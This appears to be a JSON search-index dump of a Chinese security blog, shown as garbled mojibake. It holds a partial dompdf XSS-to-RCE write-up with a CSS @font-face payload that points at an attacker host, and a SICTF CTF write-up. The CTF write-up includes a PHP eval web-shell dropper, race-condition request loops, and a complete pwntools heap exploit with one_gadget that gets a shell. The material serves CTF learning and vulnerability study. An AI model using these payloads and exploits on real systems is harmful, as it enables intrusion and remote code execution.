é‰´äºè¯¥ç«™ç‚¹æ²¡æœ‰åœ¨å®¢æˆ·ç«¯çš„æµè§ˆå™¨ä¸­å­˜å‚¨ä»»ä½•æ•æ„Ÿä¿¡æ¯ï¼ˆä¾‹å¦‚èº«ä»½éªŒè¯ cookieï¼‰ï¼Œè¿™æœ¬èº«å°±æ˜¯ä¸€ä¸ªä½ä¸¥é‡æ€§çš„å‘ç°ã€‚\nç„¶åæˆ‘ä»¬è¾“å…¥playloadï¼š\nhttp://localhost:9000/dompdf/lib/fonts/exploitfont_normal_3f83639933428d70e74a061f39009622.php å‘ç°rceæˆåŠŸï¼\nåˆ†ææ¼æ´ç‚¹ï¼š #\ræ­¤æ—¶ï¼Œæˆ‘ä»¬å°†æ³¨æ„åŠ›è½¬ç§»åˆ°dompdf çš„æºä»£ç ä¸Šï¼Œçœ‹çœ‹æˆ‘ä»¬æ˜¯å¦èƒ½å¤Ÿæ‰¾åˆ°å¯ä»¥è®©æˆ‘ä»¬è¿›ä¸€æ­¥è®¿é—®æœåŠ¡å™¨çš„æ¼æ´ã€‚\né¦–å…ˆæ˜¯ä¸¤ä¸ªé…ç½®ï¼š\nåœ¨ PDF æ¸²æŸ“æœŸé—´æ‰§è¡ŒåµŒå…¥å¼ PHPï¼Œä¹‹åçš„è¢«ç¦ç”¨äº†ã€‚\n/** * Enable embedded PHP * * If this setting is set to true then DOMPDF will automatically evaluate * embedded PHP contained within ... tags. * * ==== IMPORTANT ==== * Enabling this for documents you do not trust (e.g. arbitrary remote html * pages) is a security risk. Embedded scripts are run with the same level of * system access available to dompdf. Set this option to false (recommended) * if you wish to process untrusted documents. * * This setting may increase the risk of system exploit. Do not change * this settings without understanding the consequences. Additional * documentation is available on the dompdf wiki at: * * * @var bool */ private $isPhpEnabled = false; è¿œç¨‹èµ„æºåŠ è½½ï¼š\n/** * Enable remote file access * * If this setting is set to true, DOMPDF will access remote sites for * images and CSS files as required. * * ==== IMPORTANT ==== * This can be a security risk, in particular in combination with isPhpEnabled and * allowing remote html code to be passed to $dompdf = new DOMPDF(); $dompdf-\u0026gt;load_html(...); * This allows anonymous users to download legally doubtful internet content which on * tracing back appears to being downloaded by your server, or allows malicious php code * in remote html pages to be executed by your server with your account privileges. * * This setting may increase the risk of system exploit. Do not change * this settings without understanding the consequences. Additional * documentation is available on the dompdf wiki at: * * * @var bool */ private $isRemoteEnabled = false; ç„¶åæˆ‘ä»¬å¯ä»¥æµ‹è¯•æ˜¯å¦è¿™ä¸ªåŠŸèƒ½å¼€å¯ åˆ©ç”¨xssæ„é€ è¯­å¥ï¼š?t=aa\u0026lt;link rel=stylesheet href=\u0026quot;xxxxxxx/test.css\u0026quot;\u0026gt;\u0026amp;pdf\nè®¾ç½®æ—¶$isRemoteEnabledï¼ˆæˆ–ç‰ˆæœ¬ â‰¤ 0.8.5ï¼Œæ— è®ºæ­¤è®¾ç½®å¦‚ä½•ï¼‰ï¼Œdompdf å…è®¸é€šè¿‡ font-face CSS è§„åˆ™åŠ è½½è‡ªå®šä¹‰å­—ä½“ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\n@font-face { font-family:\u0026#39;TestFont\u0026#39;; src:url(\u0026#39;http://attacker.local/test_font.ttf\u0026#39;); font-weight:\u0026#39;normal\u0026#39;; font-style:\u0026#39;normal\u0026#39;; } å½“ä½¿ç”¨å¤–éƒ¨å­—ä½“æ—¶ï¼Œdompdf å°†å…¶ç¼“å­˜åœ¨æœ¬åœ°/lib/fontså­ç›®å½•ä¸­ï¼Œå¹¶åœ¨dompdf_font_family_cache.phpusingä¸­æ·»åŠ ç›¸åº”çš„æ¡ç›®saveFontFamilies()ã€‚æ­¤å‡½æ•°å°† dompdf å·²çŸ¥çš„å­—ä½“ç¼–ç ä¸º PHP æ•°ç»„ï¼Œä»¥åŠç¨åæŸ¥æ‰¾å®ƒä»¬æ‰€éœ€çš„ä¿¡æ¯ã€‚\nä»æˆ‘ä»¬åœ¨ç³»ç»Ÿå…¶ä»–åœ°æ–¹æ‰¾åˆ°çš„æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬å·²ç»æ€€ç–‘ dompdf å­˜å‚¨åœ¨å¯ä» web-root è®¿é—®çš„ç›®å½•ä¸­ï¼Œå®é™…ä¸Šåœ¨å°è¯•è®¿é—®å­—ä½“ç¼“å­˜ç´¢å¼•æ—¶ç¼ºå°‘é”™è¯¯æ¶ˆæ¯ä¼¼ä¹è¡¨æ˜ç›¸åŒï¼š\nä¸‹ä¸€æ­¥ï¼šå­—ä½“ç¼“å­˜ #\rå¦‚æœæˆ‘ä»¬ä¸èƒ½ä½¿ç”¨å­—ä½“ç¼“å­˜ç´¢å¼•â€¦â€¦æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨å­—ä½“ç¼“å­˜å—ï¼Ÿ çœ‹ä¸‹dompdfå¦‚ä½•å¦‚ä½•æ³¨å†Œæ–°å­—ä½“(éƒ¨åˆ†ï¼Œå…·ä½“åœ¨è¿™é‡Œ\n/** * @param array $style * @param string $remoteFile * @param resource $context * @return bool */ public function registerFont($style, $remoteFile, $context = null) { $fontname = mb_strtolower($style[\u0026#34;family\u0026#34;]); $styleString = $this-\u0026gt;getType(\u0026#34;{$style[\u0026#39;weight\u0026#39;]} {$style[\u0026#39;style\u0026#39;]}\u0026#34;); $fontDir = $this-\u0026gt;options-\u0026gt;getFontDir(); $remoteHash = md5($remoteFile); $prefix = $fontname . \u0026#34;_\u0026#34; . $styleString; $prefix = preg_replace(\u0026#34;[\\\\W]\u0026#34;, \u0026#34;_\u0026#34;, $prefix); $prefix = preg_replace(\u0026#34;/[^-_\\\\w]+/\u0026#34;, \u0026#34;\u0026#34;, $prefix); $localFile = $fontDir . \u0026#34;/\u0026#34; . $prefix . \u0026#34;_\u0026#34; . $remoteHash; $localFile .= \u0026#34;.\u0026#34;.strtolower(pathinfo(parse_url($remoteFile, PHP_URL_PATH), PATHINFO_EXTENSION)); // Download the remote file list($remoteFileContent, $http_response_header) = @Helpers::getFileContent($remoteFile, $context); $localTempFile = @tempnam($this-\u0026gt;options-\u0026gt;get(\u0026#34;tempDir\u0026#34;), \u0026#34;dompdf-font-\u0026#34;); file_put_contents($localTempFile, $remoteFileContent); $font = Font::load($localTempFile); if (!$font) { unlink($localTempFile); return false; } $font-\u0026gt;parse(); $font-\u0026gt;close(); unlink($localTempFile); // Save the changes file_put_contents($localFile, $remoteFileContent); $this-\u0026gt;saveFontFamilies(); return true; } å¯ä»¥çœ‹åˆ°ï¼Œæ–°ç¼“å­˜å­—ä½“çš„åå­—æ˜¯ç¡®å®šäº†çš„ï¼Œå­—ä½“åç§°ï¼Œ**æ ·å¼,MD5(RemoteURL)**è¿™ä¸‰ä¸ªç»„æˆï¼Œæ¯”å¦‚ï¼Œurlæ˜¯è¿™æ ·:http://attacker.local/test_font.ttfæ ·å¼ä¸ºnormalï¼Œé‚£ä¹ˆå°†è¢«å­˜ä¸ºï¼štestfont_normal_d249c21fbbb1302ab53282354d462d9e.ttf\né‚£ä¹ˆè¿™æ ·çš„è¯ï¼Œå³ä½¿æ²¡æœ‰ç›®å½•éå†çš„æ´ï¼Œä¹Ÿå¯ä»¥ä¸ç”¨çˆ†ç ´ç›´æ¥çŸ¥é“æ–‡ä»¶åã€‚\nä½†æ˜¯æºç æœ‰ä¸ªé—®é¢˜ï¼Œä»–åˆ¤æ–­å­—ä½“æ–‡ä»¶æ˜¯å¦æ­£å¸¸ï¼Œæ˜¯åŸºäºä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶å¤´ï¼Œç±»ä¼¼Linuxçš„åˆ¤æ–­æ–¹å¼ï¼Œè€Œä¸ç®¡æ–‡ä»¶åç¼€ï¼Œé‚£ä¹ˆå³ä½¿ä½¿ç”¨å…¶ä»–åç¼€ï¼Œåªè¦ç¬¦åˆttfçš„æ–‡ä»¶å¤´æ ‡å‡†ï¼Œä»å¯è¢«è§£æã€‚\nä¸‹é¢æ˜¯æ„é€ çš„cssä»¥åŠttf(php)ï¼š\n@font-face { font-family:\u0026#39;exploitfont\u0026#39;; src:url(\u0026#39;http://localhost:9001/exploit_font.php\u0026#39;); font-weight:\u0026#39;normal\u0026#39;; font-style:\u0026#39;normal\u0026#39;; } ttfç»“æ„ç½‘ä¸Šæœå°±æœ‰äº†\nttfæ–‡ä»¶ç»“æ„ https://juejin.cn/post/7010064099027451912 åŸæ–‡åœ°å€ï¼šhttps://positive.security/blog/dompdf-rce\n","date":"13 September 2023","externalUrl":null,"permalink":"/posts/rce-pdf/","section":"Posts","summary":"","title":"ä»XSSåˆ° RCE (dompdf 0day)","type":"posts"},{"content":"","date":"13 September 2023","externalUrl":null,"permalink":"/tags/%E5%A4%8D%E7%8E%B0/","section":"Tags","summary":"","title":"å¤ç°","type":"tags"},{"content":"WEB #\rç­¾åˆ°include #\ré¦–å…ˆè¿›å…¥å‘ç°æœ‰SICTFä¼ å‚ï¼Œå¹¶ä¸”é™åˆ¶äº†å‰ä¸‰ä¸ªå­—ç¬¦ä¸ºphp åŠ ä¸Šè¿™é‡Œæœ‰includeï¼ˆï¼‰å¯æ¨æ–­ä¸ºæ–‡ä»¶åŒ…å«æ¼æ´ åˆ©ç”¨phpä¼ªåè®®\nå¾—åˆ°å¯†æ–‡ PD9waHAKJGZpbGVfcGF0aCA9ICIvZmxhZyI7CmlmIChmaWxlX2V4aXN0cygkZmlsZV9wYXRoKSkgewogICAgJGZsYWcgPSBmaWxlX2dldF9jb250ZW50cygkZmlsZV9wYXRoKTsKfQplbHNlewogICAgZWNobyAiZXJyb3IiOwp9Cg==\nbase64è§£å¯†\n\u0026lt;?php $file_path = \u0026#34;/flag\u0026#34;; if (file_exists($file_path)) { $flag = file_get_contents($file_path); } else{ echo \u0026#34;error\u0026#34;; ?\u0026gt; å¯è§ç›´æ¥è¯»flagç›®å½•å³å¯å¾—åˆ°flag è§£ç å¾—åˆ° SICTF{ed2cb4ee-506f-47a8-821e-eb222183bad6}\nPHP_baby #\rè¿›æ¥å…ˆçœ‹æºä»£ç  å‘ç°å¯¹keyåšäº†é™åˆ¶ å‚è€ƒæ–‡ç« ï¼šhttps://blog.csdn.net/mochu7777777/article/details/115050295 ç»•è¿‡ ç„¶åè¿™é‡Œä¸€çœ¼æ— å‚æ•°rce å‚è€ƒï¼šhttps://zhuanlan.zhihu.com/p/157431794\nBABY_PHP #\rçœ‹åˆ°å¯¹ï¼Œå’Œï¼ˆåšäº†é™åˆ¶ ç»•è¿‡ ç„¶åè¯•ç€è¯»flag å‘ç°ä¸ºç©ºï¼Œæ‰€ä»¥å†³å®šçœ‹é¡µé¢æºä»£ç  æ‰€ä»¥è¿™ä¸ªå’Œincludeé‚£é“é¢˜ä¸€æ ·ç›´æ¥cat /flagå°±è¡Œ\næ‹¿åˆ°flag\nä½ èƒ½è·Ÿå¾—ä¸Šæˆ‘çš„speedå—ã€ #\rè¿›æ¥é¦–å…ˆéšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ å‘ç°è¢«ç§’åˆ  ç„¶åæ€è·¯å°±æ˜¯æ¡ä»¶ç«äº‰ ä¸Šä¼ 4.php\n\u0026lt;?php file_put_contents(\u0026#34;1.php\u0026#34;,\u0026#39;\u0026lt;?php eval($_GET[\u0026#34;123\u0026#34;]);?\u0026gt;\u0026#39;); echo \u0026#34;success\u0026#34;; ?\u0026gt; burpä¸€ç›´å‘åŒ…ç„¶åå†™ä¸€ä¸ªpython\u0026rsquo;ä¸€ç›´è¯»è¿™ä¸ªæ–‡ä»¶\nimport requests while 1: requests.get(\u0026#34;http://210.44.151.51:10441/uploads/4.php\u0026#34;) print(\u0026#34;test\u0026#34;) playloadï¼šhttp://210.44.151.51:10441/uploads/1.php?123=phpinfo();\nhttp://210.44.151.51:10441/uploads/1.php?123=echo%20`cat%20/flag; RE #\ræ‹¿åˆ°ä¸€ä¸ªæ–‡ä»¶ ç›´æ¥txtæŸ¥çœ‹ get flag\nvirus #\rå› ä¸ºä¸»åŠæ–¹ä¸æŸ¥wpï¼Œæ‰€ä»¥é‚£è¾¹åªè¦æ±‚äº¤éƒ¨åˆ†å›¾ç‰‡ soï¼Œæ²¡æœ‰å†™wp ç¤¾å·¥ #\rè´­ç‰©ä¹‹æ—… #\rçœ‹è§æ´»åŠ¨ æŸ¥æ‰¾ å‘ç°åœ¨é¡ºä¹‰é‡‘è¡—\nç„¶åå†çœ‹åˆ°BHGç›´æ¥æŸ¥è¯¢\næ‰¾åˆ°åœ°å€ åŒ—äº¬å¸‚é¡ºä¹‰åŒºæ–°é¡ºå—å¤§è¡—åŒ—äº¬åè”é¡ºä¹‰é‡‘è¡—è´­ç‰©ä¸­å¿ƒ\nå¤©æ¡¥ #\ræ ¹æ®å›¾ç‰‡åˆ¤æ–­ 1æ—è¾¹ä¸ºå…¬äº¤è½¦2å…¬å®¶è½¦ä¸“ç”¨è½¦é“åŸå¸‚æœ‰åŒ—äº¬ï¼Œå¤©æ´¥ï¼Œè´µé˜³ï¼Œéƒ‘å·ï¼Œå¤§è¿ï¼Œæ­å·ï¼Œæµ·å£ï¼Œå—äº¬ï¼Œæ­¦æ±‰ï¼Œä¹Œé²æœ¨é½ï¼Œå¦é—¨ï¼Œè¥¿å®‰ï¼Œæ²ˆé˜³ï¼Œé“¶å·ï¼Œæ°‘å’Œï¼Œä¸Šæµ·ï¼Œæ·±åœ³3ä¸­é—´æŠ¤æ ä¸ºé‡‘è‰²4æŠ¤æ åº•åº§æœ‰å¹³è¡ŒèŠ±çº¹ï¼ŒæŸ±å¤´ä¸ºé‡‘å­—å¡”å½¢çŠ¶ï¼Œä¾§é¢å¤§å­©å­æœ‰ä¸ªåœ†å½¢æˆ–äººå½¢å›¾æ¡ˆ5åœ¨ç½‘ä¸ŠæŸ¥æ‰¾ç…§ç‰‡ä»”ç»†å¯¹æ¯”ï¼Œç¬¦åˆä¸Šè¿°æ¡ä»¶ä¸ºè¥¿å®‰å¸‚æ”¿æŠ¤æ 5ä»è¥¿å®‰å¯»æ‰¾å¹¶ä»”ç»†å¯¹æ¯”6ä»å›¾ç‰‡çœ‹å‡ºé“è·¯ä¸¤æ—æ ‘å¶å½¢çŠ¶æ¨æ–­æ ‘å¤§æ¦‚ä¸ºæ¢§æ¡æ ‘7ä»ä¸Šè¿°æ¡ä»¶æŸ¥æ‰¾å¾—å‡ºç­”æ¡ˆ\nç¾¤é‡Œæœ‰äººè¯´æ˜¯ä½™å‡ºçš„é¢˜çœ‹qqç©ºé—´åˆ¤æ–­æ˜¯é™•è¥¿\nç„¶ååœ¨åœ°å›¾ä¸Šå¯¹æ¯”å¾—å‡ºç­”æ¡ˆ\né™•è¥¿çœè¥¿å®‰å¸‚ç¢‘æ—åŒºå‹è°Šè¥¿è·¯\nç¾ä¸½çš„æœˆå…‰ #\r4.89 QkP:/ å¤åˆ¶æ‰“å¼€æŠ–éŸ³ï¼Œçœ‹çœ‹# ç½‘ç»œè¿·è¸ª # æ¨ç† # å†¯æŸ¯å— ç½‘ç»œè¿·è¸ªï¼šæ¨ç†ä¸­ç¯ç¯ç›¸æ‰£çš„é€»è¾‘ é—æ†¾è¿™æ˜¯ä¸€æ¬¡å‡ ä¹å¤±è´¥çš„æŒ‘æˆ˜ # \u0026hellip; https://v.douyin.com/ieAjDv3B/\né‡åº†å¸‚åˆå·åŒºç§‹å­£\nå®å¡”é•‡æ²³å¦– #\rç™¾åº¦è¯†å›¾ ç›´æ¥æ‰¾åœ°ç‚¹å®ç›¸å¯º\nå±±ä¸œçœæµå®å¸‚æ±¶ä¸Šå¿\nç¾å¥³å§å§ #\rç™¾åº¦è¯†å›¾ å®šä½ç›´æ¥çœ‹ ç„¶åå‘¨å›´çš„å…¬å›­ ç¦å»ºçœç¦å·å¸‚ä»“å±±åŒºçƒŸå°å±±å…¬å›­\npwn #\rç­¾åˆ° #\ræ‰“å¼€åˆ¤æ–­ä¸ºä¸‹æº¢\nç›´æ¥nc ip port\nä¹°2**32-1000ä¸ª ç›´æ¥ä¹°flag BABY_HEAP #\rIDAå¯åŠ¨ å…ˆç”³è¯·16ä¸ªå †å—æ§åˆ¶chunk_sizeä½œä¸ºä¼ªå—å¤´\n0x100åˆšå¥½æº¢å‡º èƒ½å¤Ÿåœ¨é‡Œé¢å†™0 ç„¶åhouse of orangeæ‰‹æ³•æ‹¿åˆ°ä¸€å—unsorted biné‡Œçš„å— ä¹‹åæ‰§è¡Œunsorted binï¼Œæ‹¿ä¸‹ä¹‹å‰åœ¨å—è¡¨é‡Œçš„ä¼ªå— unsorted bin attack* ä¹‹ååˆ©ç”¨gotè¡¨æ‹†å‡ºmallocåœ°å€ æ³„éœ²libc æœ€åæŠŠmallocæåˆ°one gadgetä¸Šå°±èƒ½getshell\nfrom pwn import * context.terminal = [\u0026#39;konsole\u0026#39;, \u0026#39;-e\u0026#39;] context.log_level = \u0026#39;debug\u0026#39; #p = process(\u0026#34;./baby_heap\u0026#34;) p = remote(\u0026#34;210.44.151.51\u0026#34;, 10069) elf = ELF(\u0026#34;./baby_heap\u0026#34;) def add(size, content): p.recvuntil(\u0026#34;\u0026gt;\\n\u0026#34;) p.sendline(\u0026#34;1\u0026#34;) p.recvuntil(\u0026#34;:\\n\u0026#34;) p.sendline(str(size)) p.recvuntil(\u0026#34;:\\n\u0026#34;) p.sendline(content) def edit(idx, size, content): p.recvuntil(\u0026#34;\u0026gt;\\n\u0026#34;) p.sendline(\u0026#34;2\u0026#34;) p.recvuntil(\u0026#34;:\\n\u0026#34;) p.sendline(str(idx)) p.recvuntil(\u0026#34;:\\n\u0026#34;) p.sendline(str(size)) p.recvuntil(\u0026#34;:\\n\u0026#34;) p.sendline(content) def show(idx): p.recvuntil(\u0026#34;\u0026gt;\\n\u0026#34;) p.sendline(\u0026#34;3\u0026#34;) p.recvuntil(\u0026#34;:\\n\u0026#34;) p.sendline(str(idx)) return u64(p.recv(8)) # Construct chunk_size for i in range(16): add(0x100, \u0026#34;owo\u0026#34;) add(0x110, \u0026#34;awa\u0026#34;) add(0x1, \u0026#34;q\u0026#34;) edit(17, 0x30, b\u0026#39;a\u0026#39; * 0x18 + p64(0xdc1)) add(0x1000, \u0026#34;qwq\u0026#34;) edit(17, 0x40, b\u0026#39;a\u0026#39; * 0x18 + p64(0x111) + p64(114514) + p64(0x4040c8)) add(0x100, \u0026#34;nya\u0026#34;) add(0x100, \u0026#34;owo\u0026#34;) edit(20, 0x10, p64(0) + p64(elf.got[\u0026#39;malloc\u0026#39;])) malloc_addr = show(0) log.success(\u0026#34;malloc_addr = \u0026#34; + hex(malloc_addr)) libc_base = malloc_addr - 0x84180 one_gadget_addr = 0xf1247 + libc_base edit(0, 0x8, p64(one_gadget_addr)) #gdb.attach(p) p.recvuntil(\u0026#34;\u0026gt;\\n\u0026#34;) p.sendline(\u0026#34;1\u0026#34;) p.recvuntil(\u0026#34;:\\n\u0026#34;) p.sendline(\u0026#34;233\u0026#34;) p.interactive() ","date":"6 February 2023","externalUrl":null,"permalink":"/posts/sictf/","section":"Posts","summary":"","title":"SICTFround2 wp","type":"posts"},{"content":"\rå…³äºæˆ‘\rID: DELETE/DT/mengluo\nå­¦æ ¡: å¹¿ä¸œè´¢ç»å¤§å­¦ å¤§äºŒåœ¨è¯»\nå›¢é˜Ÿ: 0XFFF, G0xU5kal1\nè”ç³»æ–¹å¼ QQ: NjAxZjQ3OGQzZmYyODRiMGY4Nzk3MDE3Y2I0ZWFmNjc=\nTO Y also TO M\né™å¿ƒå­¦ä¹ .....\n","externalUrl":null,"permalink":"/about/","section":"Delete's blog","summary":"","title":"ABOUT MEEE","type":"page"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]